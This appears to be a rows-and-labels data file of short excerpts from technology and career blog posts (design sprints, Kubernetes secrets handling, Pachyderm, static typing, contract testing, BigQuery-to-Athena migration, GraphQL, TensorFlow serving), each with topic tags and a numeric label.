2117,"Teams can utilise physical environments to advance the discipline and create meaningful relationships with their counterparts. Product people want to do great work. Great collaborative environments give the team purpose and alignment. Rituals like design sprints resolve people problems and accelerate decision making. Inevitably, the evolution of your design career will lead you away from Thunderbolt displays and towards facilitation in physical spaces. On average, designers spend 40% of their time at work engaged in non-design activities: persuading, selling, and sharing work that doesnt involve shipping software. Roughly 24 minutes per hour are devoted to the collaboration of some form. In short, Product Design is a contact sport.","['Design', 'Collaboration', 'Management And Leadership', 'Design Thinking']",0
2118,"The output of our four-squad design sprint were on display for the entire company. One artefact in particular, the car buying journey map, was about 10 meters in length and hung on the interior wall. It was the focus of many walk-throughs with stakeholders. One outcome, a follow-up session with our Customer Support Manager, sparked a kick off regarding what a sales assisted order might look. She was exposed to the physical space, new ideas and perspectives arose. Customer Support, previously excluded from the product design process, emerged as a vital partner. At carwow, the car buyer journey artefact was an opportunity to clarify the story throughout the organisation. Executives, Finance and Commercial, swung by for a tour. Those who engaged contributed their ideas to the greater good, positive discussions ensued, and the design offering was elevated.","['Design', 'Collaboration', 'Management And Leadership', 'Design Thinking']",1
2119,"Research shows even short walks build up BDNF which supports healthy hippocampus development. Creative problem solvers need BDNF because the hippocampus is the part of the brain involved in improving our ability to imagine new situations. Physical movements can stimulate the imagination and language for learning, problem-solving, and creative work. Were physical beings intended for community and movement. Ive previously written on how working around a whiteboard breaks down barriers and accelerates decision making. I suggest putting down the headphones, heading to the war room, getting the blood flowing, and making something new.","['Design', 'Collaboration', 'Management And Leadership', 'Design Thinking']",4
2120,"To me, great collaborative spaces were always part crime scene, part band rehearsal. Team members either participated in the ongoing investigation or jammed with the rest of us, getting the groove right. Its the most exciting part of the design process. If done well, war rooms can be festive, engaging, and powerful. Unlike shipping digital products, war rooms create lasting quality beyond themselves. Thanks, Carol, for keeping the fire going and reminding me why my work mattered and where it fit within the bigger picture.","['Design', 'Collaboration', 'Management And Leadership', 'Design Thinking']",0
2121,"This design centered around the AWS Auto Scaling engine being able to compute the desired capacity for a Titus service, relay that capacity information to Titus, and for Titus to adjust capacity by launching new or terminating existing containers. There were several advantages to this approach. First, Titus was able to leverage the same proven auto scaling engine that powers AWS rather than having to build our own. Second, Titus users would get to use the same Target Tracking and Step Scaling policies that they were familiar with from EC2. Third, applications would be able to scale on both their own metrics, such as request per second or container CPU utilization, by publishing them to Cloud Watch as well as AWS-specific metrics, such as SQS queue depth. Fourth, Titus users would benefit from the new auto scaling features and improvements that AWS introduces.","['AWS', 'Netflixoss', 'Titus', 'Containers', 'Autoscaling']",10
2122,"The key challenge was enabling the AWS Auto Scaling engine to call the Titus control plane running in Netflixs AWS accounts. To address this, we leveraged AWS API Gateway, a service which provides an accessible API front door that AWS can call and a backend that could call Titus. API Gateway exposes a common API for AWS to use to adjust resource capacity and get capacity status while allowing for pluggable backend implementations of the resources being scaled, such as services on Titus. When an auto scaling policy is configured on a Titus service, Titus creates a new scalable target with the AWS Auto Scaling engine. This target is associated with the Titus Job ID representing the service and a secure API Gateway endpoint URL that the AWS Auto Scaling engine can use. The API Gateway front door is protected via AWS Service Linked Roles and the backend uses Mutual TLS to communicate to Titus.","['AWS', 'Netflixoss', 'Titus', 'Containers', 'Autoscaling']",11
2123,"Dont do it if you consider it a promotion. In the many tech companies I have spoken to, management is a parallel track to technical individual contributor. As an individual contributor, your core responsibility is your code. As an EM, your core responsibility is people. No matter how much of a rock star you are at coding, you will return to junior level in the department of management skills. for lots of the core skills of management. The drop in efficiency and effectiveness is actually most pronounced if you feel super productive as an individual contributor. At Shop Back, track changes dont come with compensation or benefit changes, so realistically speaking, there is no reason to see it as a promotion.","['Leadership', 'Engineering Mangement', 'Software Engineer']",0
2124,"The next scope for prioritisation is what is important to you as a manager. Everyone has their own style, and every team member will have their own needs. A team of 4 fresh graduates working on a product without product market fit has vastly different needs from a team of 8 veteran engineers maintaining enterprise systems at a global scale. If you want to be a tech lead who does one-on-ones and performance reviews, then you would prioritise one-on-ones, and code reviews over hiring and culture building. It helps to be clear what kind of manager you want to be, and revisit that definition as you go along because you will constantly have all sorts of work clamouring for attention, and you need to avoid spreading your efforts too thin. As a manager, your job is to become a better manager.","['Leadership', 'Engineering Mangement', 'Software Engineer']",0
2125,"Code has now become synonymous with computer science. If you are a CS grad, you have probably noticed this, and you know that this equivalence is a disservice to both disciplines. If you are not in this line of work, you may wonder what the difference is. The nuances lie not just in skill set, but also in focusthough, of course, there is overlap.",[''],9
2126,"Framing CS as the sector most representative of STEM funnels people who want to explore the industry into one narrow field within it. This means other areas of the stack miss out on fresh blood and diversity. Youd be surprised at how creative one can be when it comes to things like low-level API design or systems engineering. Or bus design, which requires electrical engineering. Or flash storage development (e.g., flash drives and phone storage), which requires knowledge of materials science. And lets not forget areas like chassis/form-factor design, where industrial engineers and designers are needed to create the beautiful and sleek exteriors of Surfaces, Xboxes, and Pixel 3s. These subjects are ignored almost entirely in conversations about tech workers.",[''],2
2127,"For now, we create a per-environment variables to hold our secrets and add the secret to the variable based on our operational process definition, as outlined above. Once set, the padlock can be clicked, which locks down the value of the variable. Once locked the value is obscured, so cant be seen by anyone looking in Dev Ops, and also cant be unlockedfrom here on in only tasks running in the pipeline have access to the value. So now we have our secrets all sorted in Dev Ops, we need to get them into Kubernetes, without disclosing them along the way. Fortunately, thats easier than it sounds! First off, we need to create some YAML which we can use to create our secrets in our cluster. The below snippet gives an example of creating an opaque text secret, but Kubernetes documentation covers plenty of other use cases. The key in this case, though, is that the value of the secret isnt held in the YAML; doing so would undo everything were looking to achieve here. Instead we place a token where the value would be, and that token matches the name of the variable we set up in Dev Ops to hold that actual value, plus a marker so that we can identify it as a token when Dev Ops runs our pipeline. In this example, we use a couple of hashes (##)Now we can tweak the deployment step(s) to replace the tokens with the values from our secret variables right before theyre deployed to the cluster. Note that you cant do this in the build step, as they would mean storing the modified YAML as a build artefact, and again, that would have the values we dont want disclosed in it. This needs to be done during your deployment, so the file is updated, used to configure the cluster, and then destroyed thus providing a totally secure and opaque workflow.","['Kubernetes', 'Azure Devops', 'Security']",15
2128,"So, now you have a solution where your secrets are truly secret, and known only to the select few; perfect, right? Well, it will be, right up until something goes wrong and your devs want to poke around in the prod database for a bit to see whats going down. Back in the day, they did that without even thinking, because everyone knew the credentials, and if they didnt, they could always ask someone. Now they dont know, and no one will tell them. So now youre going to need to think how the bigger picture works. That might mean custom tooling to allow controlled access to the database or going back and looking at the basics like logging and metrics. Either way, youll need to resolve this, as you need to be able to support your systems, but we all know we shouldnt be poking around in production databases anyway! Speaking of logging, the other gotcha is that secrets are only secrets so long as you dont tell anyone. Keep an eye out for logs accidentally disclosing secret information, it happens way more than you might thinkfor example logging the connection string, including credentials, when failing to connect to a database. All your hard work and good intentions undone in a seconds oversight.","['Kubernetes', 'Azure Devops', 'Security']",13
2129,"So how could you get a reproducibility and traceability without too much effort? Pachyderm delivers version control for data, using language-agnostic data pipelines. It doesnt just version the data, it manages the transformations, and ensures all data is always up to date. This gives a clear data lineage. You can trace any data set back to their sources, including the date and version of your transformations. The main reason to use Pachyderm is, according to Pachyderm: So in which situation would you need Pachyderm? When working with data sets, one is actually creating a network of transformations. One data set can be used by multiple transformers, and each transformer can use multiple data sets.","['Docker', 'Pachyderm', 'Data Science', 'Data', 'Data Engineering']",8
2130,"As pipeline well use a python based command line script which uses a pickle file of a sklearn pipeline to create predictions. Pachyderm will make new or updates files available under the pfs mount. In our case, well configure that to be /pfs/iris. Data is expected to be written to /pfs/out. Knowing that, we can create a simple python application, which we will store in dsprod/models/train_model.py: This will run in a Docker image, containing also the conda environment (created from a environment.yml) and the persisted model models/model.p. Its too verbose to paste the full source code here, it can be found on Github. The Docker image is defined by the following Dockerfile: We want to run our python file from within the conda environment. To have a simple entry point, the following __url__ is used: We now will create the Docker image and push it to Docker Hub, such that Pachyderm will be able to download it: To be able to deploy the pipeline to Pachyderm, we need to tell Pachyderm which docker image to use, and which repository should be monitored for new source data. Output is always sent to the repository associated with the pipeline, having the name of the pipeline. Note that the pipeline spec is really flexible and allows a lot of configuration. In our case the following simple definition suffices: The docker tag is added such that we can exactly specify which image is to be used. Using latest is possible, but then we wont be able to force retrieval of a new docker. We would also lose reproducibility as the actual image depends on the moment of deployment. Therefore we use an explicit tag. Now we can finally deploy our transformation: It doesnt give any feedback, so lets ask Kubernetes if our Docker is running. The output shows that we now have one pod running our pipeline: The Pachdash also shows the changed pipeline. It changed in 3 aspects: The iris repo shows that its input to the iris_classifier.","['Docker', 'Pachyderm', 'Data Science', 'Data', 'Data Engineering']",7
2131,"In that case one updates the docker image, and can push that as a replacement to Pachyderm. An issue is the explicit docker tag reference in iris.json. With a new docker, one should also need to update the reference. Therefore the documentation of Pachyderm shows that using --push-images one can have that done automatically. So lets update our pipeline accordingly: Unfortunately that doesnt work as expected, at least not on my machine. Lets do it ourselves: Now we have to update our pipeline configuration __url__ to refer to our new docker tag. Note that you cant use a tag like latest, as Pachyderm will only download it once. Pachyderm will download the docker from Docker Hub, so lets push it there, and subsequently update the pipeline: The new pipeline is then in place, and will run for any updates or additions in the source repository. If the previous version was incorrect (or just failed), the files are already processed. In that case you can reprocess all existing data as follows: The previous hands on part showed the basic usage of Pachyderm, we created data repositories, added data to it, and (re)deployed pipelines to process the data. Let me summarize my personal findings about Pachyderm.+Its great how the data repositories are similar to Git repositories. One can also work with branches of data, which is a great way to support different team members working with and on the same data sets.","['Docker', 'Pachyderm', 'Data Science', 'Data', 'Data Engineering']",7
2132,"Less practical is how to deploy a new version of your pipeline to the cluster. It increases the development cycle, and it cannot be fully automated. The steps are: Build docker image, with new explicit tag Push docker image to Docker Hub Insert new docker tag into pipeline definition Push pipeline definition to Pachyderm cluster Verify it is up and running Especially the manual handling of the docker tag will limit you in putting this all easily into a CI/CD pipeline.+/-Working with Pachyderm will require some effort of the data scientists. Just as a data scientist needs to be able to work with Git, the data scientist now also needs to know how to work with this Git for data. While these kind of tools are common and accepted as productivity enhancers within the data engineering world, it is (unfortunately) often less accepted by mainstream data scientists. This will restrict the adoption rate among scientists without strong engineering skills.+It is really nice how Pachyderm simplifies the Dev Ops operations related to data wrangling. This allows a data science team to be fully self serving, which is key to flexibility and productivity.","['Docker', 'Pachyderm', 'Data Science', 'Data', 'Data Engineering']",7
2133,"The most important concept in Scrum is concentration. This approach starts with a reasonable assumption that there is only a limited amount of time for one person to actually focus on a single task. So its best to set fixed hours of work for one day and manage the percentage of work done on that day. For this very purpose, we call the segmented work unit a Story and assign a point value in the story card called a story point. Story points are used to measure the overall effort needed to develop a piece of work. If a developer concentrates 100% for one hour on a task, that is one point. When scoring Story points, we need to be careful not to overestimate or underestimate. Finding the exact scoring for the size of the task is essential. Based on the story points we set for the specific Sprint, we can calculate the velocity after factoring in the time needed for one Sprint.","['Querypie', 'Agile', 'Scrum', 'Startup', 'English']",1
2134,"In the above image, you can see how I organized the backlog and set the target for Version 1.0.0. The target date was March 1st. But when I saw the version report a few days after starting the Sprint, the expected completion date was predicted to be March 5. It took me a few seconds to realize I hadnt factored in the weekend. Saturday and Sunday are important rest days! In this report, I added that on March 2nd and 3rd we wont be working. The estimated completion date has been increased by the number of weekends, changing the final day to March 11. But at this rate we would be 10 days behind the target date, so we needed to adjust. With only a few days of Sprints, talented crew members of CHEQUER quickly adapted to the Scrum method and were able to fine-tune story cards and story scores that were initially set incorrectly.","['Querypie', 'Agile', 'Scrum', 'Startup', 'English']",6
2135,"Lets say a function or method accepts a single parameter. What can that function do with the parameter or what can be analyzed about it? But what does it depend on? Perhaps a method is being called on the parameter. This typically implies there is some assumption about the type. You cannot call that method if that type does not have that method. You normally cant, or at least shouldnt, use mathematical operators on a type that is not numeric in some way. Once any question marks are raised in the mind of the programmer looking at or using that code, none of them can be answered until you know something about the type of the parameter. If you want to call that function, you dont know what is valid to pass, until you know what type it expects. If you pass the wrong type, your code is fundamentally wrong.","['Programming', 'Static Code Analysis', 'Scripting', 'Runtime']",9
2136,"The fundamental problem with not wanting to have a compiler know the correct type and report type problems (or a similar type linter), is a lack of appreciation for the benefits of tight limitations and boundaries. Without gravity, we would not be able to walk on the earth. Sure it confines us to the ground, making it difficult to leave it, but this confinement creates freedom, the ability to go places. Until a tool knows what type something is, nothing is really known, and nothing can really happen. A compiler cannot properly compile anything without understanding something about the types. The runtime environment wont know what to run without understanding something about the types.","['Programming', 'Static Code Analysis', 'Scripting', 'Runtime']",9
2137,"Many argue that this is all unnecessary if you have automated tests. They say these will test the behavior, which is what you actually care about, and the types will be tested implicitly by this, or that as long as the behavior is tested to be correct, the types dont really matter anyway. While that is all technically true, it fails to be a cost to benefits analysis. The type is the very core of what anything is in the code. Seeing the type, and automatically verifying it was used in a valid way, gives you something to work with, the same way that gravity gives us something to work with. Seeing the type of a parameter makes the code clearer. It places some limitations about what that thing is right at the point it is defined. It creates consistency on where to find that information. It prevents you from having to immediately look at the either the implementation or the test to begin to know anything about anything about that parameter.","['Programming', 'Static Code Analysis', 'Scripting', 'Runtime']",9
2138,"Types are the limitation that gives you the most bang for your buck, the most benefit for the least amount of cost. Im not saying other limitations are not worth your time and effort, but types give you a lot for a little, or at least they make a lot possible. For example, when a statically typed variable is used in a completely invalid way for that type, the compiler can tell you this. The compiler writer has the option of making this error message very user friendly and informative. Not all compilers will do this, but the type at least makes it possible. If you have to run all your tests and wait for that line of code to be exercised, and then try to interpret a runtime error that may not even be focused on the misuse of the type, this is not as rapid and helpful of feedback as you would have gotten from a user friendly compiler error.","['Programming', 'Static Code Analysis', 'Scripting', 'Runtime']",9
2139,"If many people are convinced that the benefits of writing tests outweighs the costs, how much more so is this true of writing types? A test is a limitation and description of what is expected. If the test fails, the limitation is hit, you are not supposed to release until you get it passing. If a type is misused, a limitation is hit, and you cant/shouldnt compile and run the code until that is fixed. But you shouldnt have to have a completely separate place (the test) where you place all your limitations. You want to marry your limitations to the code, the limitations are the code, and types do this beautifully. Im not saying all we need is types, but they do successfully express limitations right inside the code itself, as part of the code.","['Programming', 'Static Code Analysis', 'Scripting', 'Runtime']",9
2140,"How much farther can we take this? What empowering limitations lie beyond types? What other limitations should we be able to express right in the code that would make it more expressive and provide a way for even more automatic, compile time verification? These are the questions we should be asking ourselves. What other questions should we be asking ourselves? What ways have we missed to make code fundamentally easier to write and read accurately?","['Programming', 'Static Code Analysis', 'Scripting', 'Runtime']",9
2141,"Last year a young colleague of mine got into a similar life stage where he was desperately trying to improve himself. He is smart, much smarter than I was at his age. Having graduated from Harvard recently, he was eager to make big impacts, quick. But it seems the harder he tries, the more resistance and less support he got from other people. His outstanding technical ability was impeded by his inability to get people to agree with him and inflexibility to agree with other people.","['Self Improvement', 'Problem Solving', 'Positive Thinking']",4
2142,"One day I invited him to grab lunch together. During the lunch, I asked him what he was doing about the situation. He told me he read the classic book How to Win Friends and Influence People. I asked what did he learn from the book. He said, I read it but it doesnt work. You are in the right direction, I replied, but you wont see the effect right away. For me, the time it takes from reading a book like that to the point where I feel the learning has become part of my philosophy and subconscious is usually 1218 months. It can be shorter or longer for you, but definitely not in days.","['Self Improvement', 'Problem Solving', 'Positive Thinking']",4
2143,"For example, I often see junior software engineers rewrote some code to solve a software bug but the bug still exists. They conclude the lines of code they changed are not the cause of the bug, so they revert the changes and rewrote another few lines of code. When that doesnt fix the problem either, they get stuck. They conclude that the problem doesnt make sense because neither the changes work. In fact, all they need to realize is maybe the bug was caused by two problems at the same time. So even though neither of the solutions could solve the problem alone, they need to keep both solutions instead of losing faith into the first solution and revert it too quickly. Its a sure way to get stuck.","['Self Improvement', 'Problem Solving', 'Positive Thinking']",13
2144,"You need to keep learning and practicing different self-improvement ideas and keep yourself challenged. It may take years or decades, but if you keep doing it, youll reach a milestone where you know your self-improvement is complete*. Solving a Rubik cube for the first timeputting randomized patterns back into orderis very satisfying. The feeling of knowing your self-improvement effort made you a complete individual is far greater. Ill describe that feeling in later posts. *Of course, self-improvement is never complete but youll reach a key milestone. Just like you can always be better at solving Rubik cubes but solving one completely for the first time is a key milestone.","['Self Improvement', 'Problem Solving', 'Positive Thinking']",4
2145,"On the provider side (a service) there will be a test to make sure the contract is never violated. Thus if the provider removes a field from a response, which is not mentioned in any contract, all tests will still pass. Because thefield was save to be removed. No consumer was using or expecting it. Thus for the example above one would not be able to remove the age or the address. As a result if the business decides customers will not be called anymore removing the phone_numberwould be possible. Even the id could be removed.","['Spring Boot', 'Spring Cloud Contract', 'Microservices', 'Integration Testing', 'Automated Testing']",11
2146,The generated contract tests pass without us writing any implementation code. Google already did all the work for us. If we use CDCT for our own services we usually have to implement the functionality after defining the contract. Thats why CDCT was called TDD for microservices above. Were done with the first step. We can verify the API behaves as expected by hitting the production API.,"['Spring Boot', 'Spring Cloud Contract', 'Microservices', 'Integration Testing', 'Automated Testing']",10
2147,We schedule a build to run the tests of the proxy project in an interval of our liking. The tests for the consumer projects can be run as often as we like. They never call the real API.,"['Spring Boot', 'Spring Cloud Contract', 'Microservices', 'Integration Testing', 'Automated Testing']",6
2148,"The updated syntax of the value part would bevalue: $(stub(22651), test(regex('d+')))Thus our stub (Wire Mock) will always provide the value 22651 to a consumer. The actual tests (the assertions) against the real API will only require the API to respond with at least one digit. Thats what the regex('d+') is for. Thus our generated assertion will change to The real API might return 12345 and the test would not care. Subsequently the test on the consumer side, which is expecting 22651 would not break.","['Spring Boot', 'Spring Cloud Contract', 'Microservices', 'Integration Testing', 'Automated Testing']",15
2149,"Seems were done Not really, try to create the following request The API does not always return the duration. Definitely not when using a fictional city. We could, and should, create a second contract covering the error case and make sure our Client can deal with the error. It would run straight into Null Pointer Exception. Having contracts, and thus stubs, for these edge cases is a great way to harden the Client to deal with more than the happy path.","['Spring Boot', 'Spring Cloud Contract', 'Microservices', 'Integration Testing', 'Automated Testing']",15
2150,"As a data engineer, it is quite likely that you are using one of the leading big data cloud platforms such as AWS, Microsoft Azure, Google Cloud for your data processing. Also, migrating data from one platform to another is something you might have already faced or will face at some point. In this post, I will show how I imported Google Big Query tables to AWS Athena. If you only need a list of tools to be used with some very high-level guidance, you can quickly look at a post that shows how to import a single Big Query table into Hive metastore. In this post, I will show one way of importing a full Big Query project (multiple tables) into both Hive and Athena metastore. There are few import limitations, for example, When you import data from partitioned tables, you cannot import individual partitions. Please check limitations before starting the process.","['Big Data', 'Data Engineering', 'Athena', 'Import Data', 'Bigquery']",8
2151,"In this case, to transfer the data to S3, I used the following: Lets check if the data got transferred to S3. I verified that from my local machine: To extract schema from AVRO data, you can use the Apache avro-tools-<version>.jar with the getschema parameter. The benefit of using this tool is that it returns schema in the form you can use directly in WITH SERDEPROPERTIES statement when creating Athena tables. You noticed I got only __url__ file per table when dumping Big Query tables. This was because of small data volumeotherwise, I would have gotten several files per table. Regardless of single or multiple files per table, its enough to run avro-tools against any single file per table to extract that tables schema. I downloaded the latest version of avro-tools which is avro-tools-1.8.2.jar. I first copied __url__ files from s3 to local disk: Avro-tools command should look like,java -jar __url__ getschema your_ __url__ > schema_file.avsc. This can become tedious if you have several AVRO files (in reality, Ive done this for a project with much more tables). Again, I used a shell script to generate commands. I created extract_schema_ __url__ with the following content: Running extract_schema_ __url__ provides the following: Executing the above commands copy extracted schema under bq_data/schemas/backend/avro/: Lets also check whats inside __url__ file.","['Big Data', 'Data Engineering', 'Athena', 'Import Data', 'Bigquery']",7
2152,"As you can see the schema is in the form that can be directly used in Athena WITH SERDEPROPERTIES. But before Athena, I used the AVRO schemas to create Hive tables. If you want to avoid Hive table creation, you can read __url__ files to extract field names and data types, but then you have to map the data types yourself from AVRO format to Athena table creation DDL. The complexity of the mapping task depends on how complex data types you have in your tables. For simplicity (and to cover most simple to complex data types), I let Hive do the mapping for me. So I created the tables first in Hive metastore. Then I used SHOW CREATE TABLE to get the field names and data types part of the DDL.","['Big Data', 'Data Engineering', 'Athena', 'Import Data', 'Bigquery']",8
2153,"As discussed earlier, Hive allows creating tables by using avro.schema.url. So once you have schema (.avsc file) extracted from AVRO data, you can create tables as follows: First, upload the extracted schemas to S3 so that __url__ can refer to their S3 locations: After having both AVRO data and schema in S3, DDL for Hive table can be created using the template shown at the beginning of this section. I used another shell script create_tables_ __url__ (shown below) to cover any number of tables: Running the script provides the following: I ran the above on Hive console to actually create the Hive tables: So I have created the Hive tables successfully. To verify that the tables work, I ran this simple query: So it works! As discussed earlier, Athena requires you to explicitly specify field names and their data types in CREATE statement. In Step 3, I extracted the AVRO schema, which can be used in WITH SERDEPROPERTIES of Athena table DDL, but I also have to specify all the fiend names and their (Hive) data types. Now that I have the tables in Hive metastore, I can easily get those by running SHOW CREATE TABLE. First, prepare the Hive DDL queries for all tables: Executing the above commands copy Hive table definitions under bq_data/schemas/backend/hql/. Lets see whats inside: By now all the building blocks needed for creating AVRO tables in Athena are there: Field names and data types can be obtained from the Hive table DDL (to be used in columns section of CREATE statement)AVRO schema (JSON) can be obtained from the __url__ files (to be supplied in WITH SERDEPROPERTIES).","['Big Data', 'Data Engineering', 'Athena', 'Import Data', 'Bigquery']",7
2154,"When all else fails, theres nothing to it but to actually debug the problem and apply an actual code fix. In the context of mitigating issues, this seems like a defeatist statement, however, all of the above mitigations address the same type of problem If you have applied a schema change to a database which causes an outage, feature flags, Blue/Green deploy or re-deploy of your application will not help here. There are strategies you can employ like backing up snapshots of your database as you deploy, but ultimately mutation of state will find a way to screw you over. The best option here is changing the way you make changes to your state. The most effective example is non-breaking backwards compatible changes, such as additional columns instead of changing the existing ones. This applies to a service-oriented architecture and management of API changes.","['Continuous Delivery', 'On Call', 'Feature Toggles', 'Blue Green Deployment']",18
2155,"Waterfall project management thinking is ingrained in our culture. Our education puts emphasis on good preparation and step-by-step prudence. Progress is meeting the marks on check points. Knowing we are on track gives us comfort and confidence, and it also helps monitoring and management easier for our teachers and leaders. Many of the modern marvels in the world wouldnt exist without waterfall. Enterprises across the globe have scaled successfully with waterfall. But waterfall has its limitations: it works well in projects of repetitive nature and relatively low uncertainty.","['Lean', 'Agile', 'Scrum']",4
2156,"Lean & Agile is about discovery against uncertainty. In Scrum, the build-measure-learn cycle is designed to occur within Sprints, and team members who work on hypothesizing, MVP (minimum viable product) building and testing need to work as close as possible with each other; i.e. Work does not have to be sequentialif something is not working or missing the mark, its totally okay to make design changes and modifications, or make the conscious decision to pursue a different approach; i.e. Mini-waterfalls defeat the purpose of iteration and only achieves the small increment benefit of Scrum.","['Lean', 'Agile', 'Scrum']",1
2157,"Scrum Sprints probably shouldnt be called sprints, actually. It should be called more like jogging or something. Yes its true that you would want your teams velocity to increase (in Scrum we use Burn Down Charts to measure this), but its not terminal velocity that you go after. It is improvement in average velocity that you pursue, i.e. more distance covered in the same amount of time. And as any long distance runner will attest, finding the right pace and rhythm is the key for going the distance.","['Lean', 'Agile', 'Scrum']",1
2158,"Dont ever settle for poor chairs or small desks. Your workspace should fit you ergonomically so your body does not experience pain or discomfort. Your job is very important and requires a ton of focus, and that requires comfort. If youre not comfortable you will not be able to perform your job the way you should, so demand properly fitting chairs, correctly adjusted monitors, keyboards, desktops, footrests if necessary, and any other accessories you may need. Your workstation should be set to your comfort on your first day of workexpect nothing less.3. Are you being taken care of from a health and education perspective? Does your work take care of your health issues? Does it allow you to have a proper vacation time for yourself, or when you have a baby or needing sometime to mourn a loved one? In other words, do they care about your mental health and well-being as a human? All of these things play a big role of whether you should continue to be where you work. You should never have to fight to make it happenfind a place where they respect and value your skills enough to offer perks that show respect to you in every way.","['Careers', 'Career Advice', 'Software Engineering', 'Management And Leadership']",0
2159,"Software engineers are the money-makers in the software industry, everything and everyone else revolves around what engineers create. Marketers, designers, managers, administrators, vice presidents, and CEOs, none of that matters if theres no software. And guess who makes the software? Therefore, you should be treated with utmost respect and provided the best comfort levels your employer can afford to offer. You are a very, very important component of your company, ergo, that should reflect on the tools and amenities you are provided in order to do your job well.","['Careers', 'Career Advice', 'Software Engineering', 'Management And Leadership']",12
2160,"Rather than spend our time trying to trick it, we should:-Make good use of Generic Types. Generics in Java can trace their orgins to Generic Java created by Philip Wadler (Haskell legend), Martin Odersky (creator of Scala), Gilad Bracha, Dave Stoutamire. Dont ignore type parameters, declare them and enforce them everywhere. Minimize casting and if instance Ofing. Where you do use them (it is still Java after allthey are likely impossible to fully eliminate), centralize each type of cast within a resuable method, use proper type parameters on the inputs and outputs and write good tests! Make illegal states unrepresentable in our code. The Haskell and Idris compilers will enforce this for you, just pretend Javac is as strict. Avoid nulls, dont throw Exceptions, avoid locking and synchronization and you will take giant leaps towards this.","['Functional Programming', 'Java', 'Software Development', 'Software Engineering', 'Programming']",9
2161,"As IT has become more engrossed in deploying with Kubernetes, we have started to see an upsurge in attacker interest in compromising Kubernetes clusters. If you want to escape becoming the next data breach organization in news, you must envisage like an attacker when safeguarding your system. In this post, Ill discuss a few things to watch out for if youre considering a move to Kubernetes, as well as some tips on ensuring that your infrastructure remains secure: We know that configuration errors flourish in the cloud: One recent study found that 7075% of companies have at least one serious AWS security misconfiguration. With containers being a somewhat new technology in software deployment, the possibility of misconfigurations due to inexperience is only multiplied. A lot of organizations will go ahead and adopt container orchestration platforms like Kubernetes before they truly comprehend the technology. Their inexperience leaves them especially vulnerable to making configuration mistakes as they deploy their applications.","['Docker', 'Kubernetes', 'Security', 'Containers']",11
2162,"Our primary application for managing the creation and assembly of ads that reach the external publishing platforms is internally dubbed Monet. Its used to supercharge ad creation and automate management of marketing campaigns on external ad platforms. Monet helps drive incremental conversions, engagement with our product and in general, present a rich story about our content and the Netflix brand to users around the world. To do this, first, it helps scale up and automate ad production and manage millions of creative permutations. Secondly, we utilize various signals and aggregate data such as understanding of content popularity on Netflix to enable highly relevant ads. Our overall aim is to make our ads on all the external publishing channels resonate well with users and we are constantly experimenting to improve our effectiveness in doing that.","['GraphQL', 'JavaScript', 'Front End Development', 'Software Engineering']",6
2163,"When we started out, the React UI layer for Monet accessed traditional REST APIs powered by an Apache Tomcat server. Over time, as our application evolved, our use cases became more complex. Simple pages would need to draw in data from a wide variety of sources. To more effectively load this data onto the client application, we first attempted to denormalize data on the backend. Managing this denormalization became difficult to maintain since not all pages needed all the data. We quickly ran into network bandwidth bottlenecks. The browser would need to fetch much more denormalized data than it would ever use.","['GraphQL', 'JavaScript', 'Front End Development', 'Software Engineering']",19
2164,"Redistributing load and payload optimization Often times, some machines are better suited for certain tasks than others. When we added the Graph QL middle layer, the Graph QL server still needed to call the same services and REST APIs as the client would have called directly. The difference now is that the majority of the data is flowing between servers within the same data center. These server to server calls are of very low latency and high bandwidth, which gives us about an 8x performance boost compared to direct network calls from the browser. The last mile of the data transfer from the Graph QL server to the client browser, although still a slow point, is now reduced to a single network call. Since Graph QL allows the client to select only the data it needs we end up fetching a significantly smaller payload. In our application, pages that were fetching 10MB of data before now receive about 200KB. Page loads became much faster, especially over data-constrained mobile networks, and our app uses much less memory. These changes did come at the cost of higher server utilization to perform data fetching and aggregation, but the few extra milliseconds of server time per request were greatly outweighed by the smaller client payloads.","['GraphQL', 'JavaScript', 'Front End Development', 'Software Engineering']",11
2165,"Chaining type systems Many people focus on type systems within a single service, but rarely across services. Once we defined the entities in our Graph QL server, we use auto codegen tools to generate Type Script types for the client application. The props of our React components receive types to match the query that the component is making. Since these types and queries are also validated against the server schema, any breaking change by the server would be caught by clients consuming the data. Chaining multiple services together with Graph QL and hooking these checks into the build process allows us to catch many more issues before deploying bad code. Ideally, we would like to have type safety from the database layer all the way to the client browser.","['GraphQL', 'JavaScript', 'Front End Development', 'Software Engineering']",8
2166,"DI/DXSimplifying development A common concern when creating client applications is the UI/UX, but the developer interface and developer experience is just as important for building maintainable apps. Before Graph QL, writing a new React container component required maintaining complex logic to make network requests for the data we need. The developer would need to consider how one piece of data relates to another, how the data should be cached, whether to make the calls in parallel or in sequence and where in Redux to store the data. With a Graph QL query wrapper, each React component only needs to describe the data it needs, and the wrapper takes care of all of these concerns. There is much less boilerplate code and a cleaner separation of concerns between the data and UI. This model of declarative data fetching makes the React components much easier to understand, and serves to partially document what the component is doing.","['GraphQL', 'JavaScript', 'Front End Development', 'Software Engineering']",10
2167,"What a tangled web we weave Abstractions are a great way to make developers more efficient until something goes wrong. There will undoubtedly be bugs in our code and we didnt want to obfuscate the root cause with a middle layer. Graph QL would orchestrate network calls to other services automatically, hiding the complexities from the user. Server logs provide a way to debug, but they are still one step removed from the natural approach of debugging via the browsers network tab. To make debugging easier, we added logs directly to the Graph QL response payload that expose all of the network requests that the server is making. When the debug flag is enabled, you get the same data in the client browser as you would if the browser made the network call directly.","['GraphQL', 'JavaScript', 'Front End Development', 'Software Engineering']",10
2168,"In the initial situation, we have one model being served in its first version 01. When clients query the tensorflow/serving REST API, they get predictions performed by the v. 01 of the model. The server runs two containerized application, tensorflow/serving and model_poller. We tweaked the models hyperparameters, retrained it and it outperforms v. 01. We now want to deploy v. 02 of our awesome model.","['TensorFlow', 'Google', 'Design Patterns', 'Google Cloud Platform', 'Machine Learning']",10
2169,"Data Scientists export the model as a saved_model. The folder looks like this: It is important to name the folder 000x where x is your model version number. Tensorflow/serving will load any new version it finds.2. Now zip it and ship the model on a storage bucket. Having one bucket per model is a best practice.3. On the server, your model_poller app continuously polls the model bucket for a new version of the model. It just detected that v. 02 is available. It downloads the latest version of the model and unzips it in the folder used by tensorflow/serving to source the models to serve.4. tensorflow/serving continuously ls its model source to see if any new model is available. It detects that a new version v. 02 of the model is available. The version manager loads the new version and unloads the old one from memory.","['TensorFlow', 'Google', 'Design Patterns', 'Google Cloud Platform', 'Machine Learning']",7
